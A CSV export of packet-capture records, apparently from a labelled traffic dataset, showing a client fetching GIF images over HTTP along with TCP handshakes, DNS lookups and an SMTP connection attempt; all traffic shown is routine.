"R"," R", "403321","12:10:12.510115","172.16.112.207","198.68.244.168","HTTP","307","GET /Images/Headers/logo_left.gif HTTP/1.0 "
"R"," R", "403322","12:10:12.523912","198.68.244.168","172.16.112.207","TCP","60","80 → 7467 [ACK] Seq=1 Ack=254 Win=32736 Len=0"
"R"," R", "403323","12:10:12.538901","198.68.244.168","172.16.112.207","TCP","1078","[TCP segment of a reassembled PDU]"
"R"," R", "403324","12:10:12.539752","198.68.244.168","172.16.112.207","HTTP","1021","HTTP/1.1 200 OK  (GIF89a)"
"R"," R", "403325","12:10:12.539806","198.68.244.168","172.16.112.207","TCP","60","80 → 7467 [FIN, ACK] Seq=1992 Ack=254 Win=32736 Len=0"
"R"," R", "403326","12:10:12.539967","172.16.112.207","198.68.244.168","TCP","60","7467 → 80 [ACK] Seq=254 Ack=1993 Win=30660 Len=0"
"R"," R", "403327","12:10:12.541743","172.16.112.207","198.68.244.168","TCP","60","7467 → 80 [FIN, ACK] Seq=254 Ack=1993 Win=32120 Len=0"
"R"," R", "403328","12:10:12.543604","198.68.244.168","172.16.112.207","TCP","60","80 → 7467 [ACK] Seq=1993 Ack=255 Win=32735 Len=0"
"R"," R", "403329","12:10:12.545079","172.16.112.207","198.68.244.168","TCP","60","7522 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "403330","12:10:12.546554","198.68.244.168","172.16.112.207","TCP","60","80 → 7522 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "403331","12:10:12.546716","172.16.112.207","198.68.244.168","TCP","60","7522 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "403332","12:10:12.547169","172.16.112.207","198.68.244.168","HTTP","308","GET /Images-home/vertical_line.gif HTTP/1.0 "
"R"," R", "403333","12:10:12.562827","198.68.244.168","172.16.112.207","HTTP","640","HTTP/1.1 200 OK  (GIF89a)HTTP/1.1 200 OK "
"R"," R", "403334","12:10:12.562895","198.68.244.168","172.16.112.207","TCP","60","80 → 7522 [FIN, ACK] Seq=587 Ack=255 Win=32736 Len=0"
"R"," R", "403335","12:10:12.563039","172.16.112.207","198.68.244.168","TCP","60","7522 → 80 [ACK] Seq=255 Ack=588 Win=31533 Len=0"
"R"," R", "403336","12:10:12.564951","172.16.112.207","198.68.244.168","TCP","60","7522 → 80 [FIN, ACK] Seq=255 Ack=588 Win=32120 Len=0"
"R"," R", "403337","12:10:12.566702","198.68.244.168","172.16.112.207","TCP","60","80 → 7522 [ACK] Seq=588 Ack=256 Win=32735 Len=0"
"R"," R", "403338","12:10:12.568350","172.16.112.207","198.68.244.168","TCP","60","7526 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "403339","12:10:12.569709","198.68.244.168","172.16.112.207","TCP","60","80 → 7526 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "403340","12:10:12.569862","172.16.112.207","198.68.244.168","TCP","60","7526 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "403341","12:10:12.570301","172.16.112.207","198.68.244.168","HTTP","303","GET /Images/footer_yellow.gif HTTP/1.0 "
"R"," R", "403342","12:10:12.583944","198.68.244.168","172.16.112.207","TCP","60","80 → 7526 [ACK] Seq=1 Ack=250 Win=32736 Len=0"
"R"," R", "403343","12:10:12.588321","198.68.244.168","172.16.112.207","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403344","12:10:12.589556","198.68.244.168","172.16.112.207","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403345","12:10:12.596698","172.16.112.207","198.68.244.168","TCP","60","7526 → 80 [ACK] Seq=250 Ack=2921 Win=32120 Len=0"
"R"," R", "403346","12:10:12.601754","198.68.244.168","172.16.112.207","HTTP","1140","HTTP/1.1 200 OK  (GIF89a)"
"R"," R", "403347","12:10:12.601868","198.68.244.168","172.16.112.207","TCP","60","80 → 7526 [FIN, ACK] Seq=4007 Ack=250 Win=32736 Len=0"
"R"," R", "403348","12:10:12.601973","172.16.112.207","198.68.244.168","TCP","60","7526 → 80 [ACK] Seq=250 Ack=4008 Win=31033 Len=0"
"R"," R", "403349","12:10:12.604035","172.16.112.207","198.68.244.168","TCP","60","7526 → 80 [FIN, ACK] Seq=250 Ack=4008 Win=32120 Len=0"
"R"," R", "403350","12:10:12.605445","198.68.244.168","172.16.112.207","TCP","60","80 → 7526 [ACK] Seq=4008 Ack=251 Win=32735 Len=0"
"R"," R", "403351","12:10:12.607632","172.16.112.207","198.68.244.168","TCP","60","7527 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "403352","12:10:12.611166","198.68.244.168","172.16.112.207","TCP","60","80 → 7527 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "403353","12:10:12.611320","172.16.112.207","198.68.244.168","TCP","60","7527 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "403354","12:10:12.611770","172.16.112.207","198.68.244.168","HTTP","309","GET /Images-home/miniguide_icon.gif HTTP/1.0 "
"R"," R", "403355","12:10:12.628334","198.68.244.168","172.16.112.207","HTTP","823","HTTP/1.1 200 OK  (GIF89a)HTTP/1.1 200 OK "
"R"," R", "403356","12:10:12.628402","198.68.244.168","172.16.112.207","TCP","60","80 → 7527 [FIN, ACK] Seq=770 Ack=256 Win=32736 Len=0"
"R"," R", "403357","12:10:12.628550","172.16.112.207","198.68.244.168","TCP","60","7527 → 80 [ACK] Seq=256 Ack=771 Win=31350 Len=0"
"R"," R", "403358","12:10:12.630691","172.16.112.207","198.68.244.168","TCP","60","7527 → 80 [FIN, ACK] Seq=256 Ack=771 Win=32120 Len=0"
"R"," R", "403359","12:10:12.632175","198.68.244.168","172.16.112.207","TCP","60","80 → 7527 [ACK] Seq=771 Ack=257 Win=32735 Len=0"
"R"," R", "403360","12:10:12.633696","172.16.112.20","192.168.1.20","DNS","90","Standard query 0x2cd3 A reservations.previewtravel.com"
"R"," R", "403361","12:10:12.638326","192.168.1.20","172.16.112.20","DNS","150","Standard query response 0x2cd3 A reservations.previewtravel.com A 198.68.244.246 NS aesop.world.net A 192.168.1.20"
"R"," R", "403362","12:10:12.639509","172.16.112.207","198.68.244.246","TCP","60","7529 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "403363","12:10:12.643644","198.68.244.246","172.16.112.207","TCP","60","80 → 7529 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "403364","12:10:12.643797","172.16.112.207","198.68.244.246","TCP","60","7529 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "403365","12:10:12.644243","172.16.112.207","198.68.244.246","HTTP","306","GET /Sponsor_gifs/att_pt_ban.gif HTTP/1.0 "
"R"," R", "403366","12:10:12.663872","198.68.244.246","172.16.112.207","TCP","60","80 → 7529 [ACK] Seq=1 Ack=253 Win=32736 Len=0"
"R"," R", "403367","12:10:12.679512","198.68.244.246","172.16.112.207","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403368","12:10:12.680744","198.68.244.246","172.16.112.207","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403369","12:10:12.686725","172.16.112.207","198.68.244.246","TCP","60","7529 → 80 [ACK] Seq=253 Ack=2921 Win=32120 Len=0"
"R"," R", "403370","12:10:12.692722","198.68.244.246","172.16.112.207","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403371","12:10:12.693980","198.68.244.246","172.16.112.207","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403372","12:10:12.695198","198.68.244.246","172.16.112.207","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403373","12:10:12.696707","172.16.112.207","198.68.244.246","TCP","60","7529 → 80 [ACK] Seq=253 Ack=7301 Win=32120 Len=0"
"R"," R", "403374","12:10:12.702515","198.68.244.246","172.16.112.207","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403375","12:10:12.703749","198.68.244.246","172.16.112.207","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403376","12:10:12.704117","198.68.244.246","172.16.112.207","HTTP","435","HTTP/1.1 200 OK  (GIF89a)"
"R"," R", "403377","12:10:12.704231","198.68.244.246","172.16.112.207","TCP","60","80 → 7529 [FIN, ACK] Seq=10602 Ack=253 Win=32736 Len=0"
"R"," R", "403378","12:10:12.704349","172.16.112.207","198.68.244.246","TCP","60","7529 → 80 [ACK] Seq=253 Ack=10603 Win=30660 Len=0"
"R"," R", "403379","12:10:12.710507","172.16.112.207","198.68.244.246","TCP","60","7529 → 80 [FIN, ACK] Seq=253 Ack=10603 Win=32120 Len=0"
"R"," R", "403380","12:10:12.713945","198.68.244.246","172.16.112.207","TCP","60","80 → 7529 [ACK] Seq=10603 Ack=254 Win=32735 Len=0"
"R"," R", "403381","12:10:12.715581","172.16.112.207","198.68.244.168","TCP","60","7530 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "403382","12:10:12.719098","198.68.244.168","172.16.112.207","TCP","60","80 → 7530 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "403383","12:10:12.719254","172.16.112.207","198.68.244.168","TCP","60","7530 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "403384","12:10:12.719757","172.16.112.207","198.68.244.168","HTTP","307","GET /Images-home/break_guides.gif HTTP/1.0 "
"R"," R", "403385","12:10:12.733904","198.68.244.168","172.16.112.207","TCP","60","80 → 7530 [ACK] Seq=1 Ack=254 Win=32736 Len=0"
"R"," R", "403386","12:10:12.737111","198.68.244.168","172.16.112.207","HTTP","1061","HTTP/1.1 200 OK  (GIF89a)HTTP/1.1 200 OK "
"R"," R", "403387","12:10:12.737179","198.68.244.168","172.16.112.207","TCP","60","80 → 7530 [FIN, ACK] Seq=1008 Ack=254 Win=32736 Len=0"
"R"," R", "403388","12:10:12.737328","172.16.112.207","198.68.244.168","TCP","60","7530 → 80 [ACK] Seq=254 Ack=1009 Win=31112 Len=0"
"R"," R", "403389","12:10:12.739755","172.16.112.207","198.68.244.168","TCP","60","7530 → 80 [FIN, ACK] Seq=254 Ack=1009 Win=32120 Len=0"
"R"," R", "403390","12:10:12.741004","198.68.244.168","172.16.112.207","TCP","60","80 → 7530 [ACK] Seq=1009 Ack=255 Win=32735 Len=0"
"R"," R", "403391","12:10:12.743668","172.16.112.207","198.68.244.168","TCP","60","7531 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "403392","12:10:12.747193","198.68.244.168","172.16.112.207","TCP","60","80 → 7531 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "403393","12:10:12.747346","172.16.112.207","198.68.244.168","TCP","60","7531 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "403394","12:10:12.747789","172.16.112.207","198.68.244.168","HTTP","303","GET /Images-home/currency.gif HTTP/1.0 "
"R"," R", "403395","12:10:12.764798","198.68.244.168","172.16.112.207","TCP","1078","[TCP segment of a reassembled PDU]"
"R"," R", "403396","12:10:12.764988","198.68.244.168","172.16.112.207","HTTP","215","HTTP/1.1 200 OK  (GIF89a)"
"R"," R", "403397","12:10:12.765057","198.68.244.168","172.16.112.207","TCP","60","80 → 7531 [FIN, ACK] Seq=1186 Ack=250 Win=32736 Len=0"
"R"," R", "403398","12:10:12.765199","172.16.112.207","198.68.244.168","TCP","60","7531 → 80 [ACK] Seq=250 Ack=1187 Win=30934 Len=0"
"R"," R", "403399","12:10:12.767639","172.16.112.207","198.68.244.168","TCP","60","7531 → 80 [FIN, ACK] Seq=250 Ack=1187 Win=32120 Len=0"
"R"," R", "403400","12:10:12.768802","198.68.244.168","172.16.112.207","TCP","60","80 → 7531 [ACK] Seq=1187 Ack=251 Win=32735 Len=0"
"R"," R", "403401","12:10:12.771608","172.16.112.207","198.68.244.246","TCP","60","7587 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "403402","12:10:12.775714","198.68.244.246","172.16.112.207","TCP","60","80 → 7587 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "403403","12:10:12.775867","172.16.112.207","198.68.244.246","TCP","60","7587 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "403404","12:10:12.776309","172.16.112.207","198.68.244.246","HTTP","305","GET /Sponsor_gifs/invisible.gif HTTP/1.0 "
"R"," R", "403405","12:10:12.792895","198.68.244.246","172.16.112.207","HTTP","415","HTTP/1.1 200 OK  (GIF89a)HTTP/1.1 200 OK "
"R"," R", "403406","12:10:12.792963","198.68.244.246","172.16.112.207","TCP","60","80 → 7587 [FIN, ACK] Seq=362 Ack=252 Win=32736 Len=0"
"R"," R", "403407","12:10:12.793097","172.16.112.207","198.68.244.246","TCP","60","7587 → 80 [ACK] Seq=252 Ack=363 Win=31758 Len=0"
"R"," R", "403408","12:10:12.795488","172.16.112.207","198.68.244.246","TCP","60","7587 → 80 [FIN, ACK] Seq=252 Ack=363 Win=32120 Len=0"
"R"," R", "403409","12:10:12.797324","198.68.244.246","172.16.112.207","TCP","60","80 → 7587 [ACK] Seq=363 Ack=253 Win=32735 Len=0"
"R"," R", "403410","12:10:12.799493","172.16.112.207","198.68.244.168","TCP","60","7588 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "403411","12:10:12.803013","198.68.244.168","172.16.112.207","TCP","60","80 → 7588 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "403412","12:10:12.803165","172.16.112.207","198.68.244.168","TCP","60","7588 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "403413","12:10:12.803615","172.16.112.207","198.68.244.168","HTTP","311","GET /Images-home/break_exclusives.gif HTTP/1.0 "
"R"," R", "403414","12:10:12.823874","198.68.244.168","172.16.112.207","TCP","60","80 → 7588 [ACK] Seq=1 Ack=258 Win=32736 Len=0"
"R"," R", "403415","12:10:12.828623","198.68.244.168","172.16.112.207","HTTP","774","HTTP/1.1 200 OK  (GIF89a)HTTP/1.1 200 OK "
"R"," R", "403416","12:10:12.828694","198.68.244.168","172.16.112.207","TCP","60","80 → 7588 [FIN, ACK] Seq=721 Ack=258 Win=32736 Len=0"
"R"," R", "403417","12:10:12.828827","172.16.112.207","198.68.244.168","TCP","60","7588 → 80 [ACK] Seq=258 Ack=722 Win=31399 Len=0"
"R"," R", "403418","12:10:12.831378","172.16.112.207","198.68.244.168","TCP","60","7588 → 80 [FIN, ACK] Seq=258 Ack=722 Win=32120 Len=0"
"R"," R", "403419","12:10:12.832449","198.68.244.168","172.16.112.207","TCP","60","80 → 7588 [ACK] Seq=722 Ack=259 Win=32735 Len=0"
"R"," R", "403420","12:10:12.835439","172.16.112.207","198.68.244.168","TCP","60","7652 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "403421","12:10:12.838966","198.68.244.168","172.16.112.207","TCP","60","80 → 7652 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "403422","12:10:12.839119","172.16.112.207","198.68.244.168","TCP","60","7652 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "403423","12:10:12.839562","172.16.112.207","198.68.244.168","HTTP","309","GET /Images-home/weather_center.gif HTTP/1.0 "
"R"," R", "403424","12:10:12.853900","198.68.244.168","172.16.112.207","TCP","60","80 → 7652 [ACK] Seq=1 Ack=256 Win=32736 Len=0"
"R"," R", "403425","12:10:12.856882","198.68.244.168","172.16.112.207","TCP","1078","[TCP segment of a reassembled PDU]"
"R"," R", "403426","12:10:12.857088","198.68.244.168","172.16.112.207","HTTP","233","HTTP/1.1 200 OK  (GIF89a)"
"R"," R", "403427","12:10:12.857158","198.68.244.168","172.16.112.207","TCP","60","80 → 7652 [FIN, ACK] Seq=1204 Ack=256 Win=32736 Len=0"
"R"," R", "403428","12:10:12.857302","172.16.112.207","198.68.244.168","TCP","60","7652 → 80 [ACK] Seq=256 Ack=1205 Win=30916 Len=0"
"R"," R", "403429","12:10:12.859990","172.16.112.207","198.68.244.168","TCP","60","7652 → 80 [FIN, ACK] Seq=256 Ack=1205 Win=32120 Len=0"
"R"," R", "403430","12:10:12.860984","198.68.244.168","172.16.112.207","TCP","60","80 → 7652 [ACK] Seq=1205 Ack=257 Win=32735 Len=0"
"R"," R", "403431","12:10:12.864116","172.16.112.207","198.68.244.158","TCP","60","7715 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "403432","12:10:12.867619","198.68.244.158","172.16.112.207","TCP","60","80 → 7715 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "403433","12:10:12.867777","172.16.112.207","198.68.244.158","TCP","60","7715 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "403434","12:10:12.868227","172.16.112.207","198.68.244.158","HTTP","299","GET /Images/125x48_vail2-promo.gif HTTP/1.0 "
"R"," R", "403435","12:10:12.883872","198.68.244.158","172.16.112.207","TCP","60","80 → 7715 [ACK] Seq=1 Ack=246 Win=32736 Len=0"
"R"," R", "403436","12:10:12.885711","198.68.244.158","172.16.112.207","TCP","1078","[TCP segment of a reassembled PDU]"
"R"," R", "403437","12:10:12.886411","198.68.244.158","172.16.112.207","HTTP","848","HTTP/1.1 200 OK  (GIF89a)"
"R"," R", "403438","12:10:12.886479","198.68.244.158","172.16.112.207","TCP","60","80 → 7715 [FIN, ACK] Seq=1819 Ack=246 Win=32736 Len=0"
"R"," R", "403439","12:10:12.886632","172.16.112.207","198.68.244.158","TCP","60","7715 → 80 [ACK] Seq=246 Ack=1820 Win=30660 Len=0"
"R"," R", "403440","12:10:12.889345","172.16.112.207","198.68.244.158","TCP","60","7715 → 80 [FIN, ACK] Seq=246 Ack=1820 Win=32120 Len=0"
"R"," R", "403441","12:10:12.892519","198.68.244.158","172.16.112.207","TCP","60","80 → 7715 [ACK] Seq=1820 Ack=247 Win=32735 Len=0"
"R"," R", "403442","12:10:12.893624","172.16.112.207","198.68.244.168","TCP","60","7716 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "403443","12:10:12.897152","198.68.244.168","172.16.112.207","TCP","60","80 → 7716 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "403444","12:10:12.897301","172.16.112.207","198.68.244.168","TCP","60","7716 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "403445","12:10:12.897745","172.16.112.207","198.68.244.168","HTTP","306","GET /Images-home/ski_reports.gif HTTP/1.0 "
"R"," R", "403446","12:10:12.914887","198.68.244.168","172.16.112.207","TCP","1078","[TCP segment of a reassembled PDU]"
"R"," R", "403447","12:10:12.915102","198.68.244.168","172.16.112.207","HTTP","246","HTTP/1.1 200 OK  (GIF89a)"
"R"," R", "403448","12:10:12.915172","198.68.244.168","172.16.112.207","TCP","60","80 → 7716 [FIN, ACK] Seq=1217 Ack=253 Win=32736 Len=0"
"R"," R", "403449","12:10:12.915315","172.16.112.207","198.68.244.168","TCP","60","7716 → 80 [ACK] Seq=253 Ack=1218 Win=30903 Len=0"
"R"," R", "403450","12:10:12.918154","172.16.112.207","198.68.244.168","TCP","60","7716 → 80 [FIN, ACK] Seq=253 Ack=1218 Win=32120 Len=0"
"R"," R", "403451","12:10:12.921309","198.68.244.168","172.16.112.207","TCP","60","80 → 7716 [ACK] Seq=1218 Ack=254 Win=32735 Len=0"
"R"," R", "403452","12:10:12.922479","172.16.112.207","198.68.244.168","TCP","60","7776 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "403453","12:10:12.926005","198.68.244.168","172.16.112.207","TCP","60","80 → 7776 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "403454","12:10:12.926154","172.16.112.207","198.68.244.168","TCP","60","7776 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "403455","12:10:12.926596","172.16.112.207","198.68.244.168","HTTP","306","GET /Images-home/break_tools.gif HTTP/1.0 "
"R"," R", "403456","12:10:12.943382","198.68.244.168","172.16.112.207","HTTP","612","HTTP/1.1 200 OK  (GIF89a)HTTP/1.1 200 OK "
"R"," R", "403457","12:10:12.943435","198.68.244.168","172.16.112.207","TCP","60","80 → 7776 [FIN, ACK] Seq=559 Ack=253 Win=32736 Len=0"
"R"," R", "403458","12:10:12.943576","172.16.112.207","198.68.244.168","TCP","60","7776 → 80 [ACK] Seq=253 Ack=560 Win=31561 Len=0"
"R"," R", "403459","12:10:12.946477","172.16.112.207","198.68.244.168","TCP","60","7776 → 80 [FIN, ACK] Seq=253 Ack=560 Win=32120 Len=0"
"R"," R", "403460","12:10:12.949671","198.68.244.168","172.16.112.207","TCP","60","80 → 7776 [ACK] Seq=560 Ack=254 Win=32735 Len=0"
"R"," R", "403461","12:10:12.950910","172.16.112.207","198.68.244.168","TCP","60","7777 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "403462","12:10:12.954434","198.68.244.168","172.16.112.207","TCP","60","80 → 7777 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "403463","12:10:12.954583","172.16.112.207","198.68.244.168","TCP","60","7777 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "403464","12:10:12.955031","172.16.112.207","198.68.244.168","HTTP","312","GET /Images-home/hotel_finder_icon.gif HTTP/1.0 "
"R"," R", "403465","12:10:12.971838","198.68.244.168","172.16.112.207","HTTP","860","HTTP/1.1 200 OK  (GIF89a)HTTP/1.1 302 Moved Temporarily "
"R"," R", "403466","12:10:12.971904","198.68.244.168","172.16.112.207","TCP","60","80 → 7777 [FIN, ACK] Seq=807 Ack=259 Win=32736 Len=0"
"R"," R", "403467","12:10:12.972052","172.16.112.207","198.68.244.168","TCP","60","7777 → 80 [ACK] Seq=259 Ack=808 Win=31313 Len=0"
"R"," R", "403468","12:10:12.975104","172.16.112.207","198.68.244.168","TCP","60","7777 → 80 [FIN, ACK] Seq=259 Ack=808 Win=32120 Len=0"
"R"," R", "403469","12:10:12.978254","198.68.244.168","172.16.112.207","TCP","60","80 → 7777 [ACK] Seq=808 Ack=260 Win=32735 Len=0"
"R"," R", "403470","12:10:13.699478","135.13.216.191","172.16.114.168","TCP","60","19359 → 25 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "403471","12:10:13.699698","172.16.114.168","135.13.216.191","TCP","60","25 → 19359 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "403472","12:10:13.700447","135.13.216.191","172.16.114.168","TCP","60","19359 → 25 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "403473","12:10:13.714056","172.16.112.20","192.168.1.20","DNS","87","Standard query 0x2cd4 PTR 191.216.13.135.in-addr.arpa"
